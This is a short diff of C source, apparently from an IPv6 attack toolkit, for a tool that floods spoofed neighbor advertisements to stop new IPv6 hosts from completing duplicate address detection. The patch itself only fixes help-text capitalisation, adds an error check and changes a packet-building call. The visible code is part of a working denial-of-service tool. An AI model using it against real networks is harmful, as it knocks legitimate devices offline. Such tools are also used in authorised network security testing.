@@ -21,8 +21,8 @@ int i;
 void help(char *prg) {
   printf("%s %s (c) 2013 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
   printf("Syntax: %s interface\n\n", prg);
-  printf("This tools prevents new ipv6 interfaces to come up, by sending answers to\n");
-  printf("duplicate ip6 checks (DAD). This results in a DOS for new ipv6 devices.\n\n");
+  printf("This tools prevents new IPv6 interfaces to come up, by sending answers to\n");
+  printf("duplicate ip6 checks (DAD). This results in a DOS for new IPv6 devices.\n\n");
   exit(-1);
 }
 
@@ -94,14 +94,17 @@ int main(int argc, char *argv[]) {
   if (debug)
     printf("Preparing spoofed packet for speed-up\n");
   interface = argv[1];
-  ownmac = thc_get_own_mac(interface);
+  if ((ownmac = thc_get_own_mac(interface)) == NULL) {
+    fprintf(stderr, "Error: invalid interface %s\n", interface);
+    exit(-1);
+  }
   memset(dummy, 'X', sizeof(dummy));
   dummy[16] = 2;
   dummy[17] = 1;
   memcpy(&dummy[18], ownmac, 6);
   dst = thc_resolve6("ff02::1");
   dstmac = thc_get_multicast_mac(dst);
-  if ((pkt = thc_create_ipv6(interface, PREFER_LINK, &pkt_len, dummy, dst, 255, 0, 0, 0, 0)) == NULL)
+  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, dummy, dst, 255, 0, 0, 0, 0)) == NULL)
     return -1;
   if (thc_add_icmp6(pkt, &pkt_len, ICMP6_NEIGHBORADV, 0, ICMP6_NEIGHBORADV_OVERRIDE, dummy, 24, 0) < 0)
     return -1;
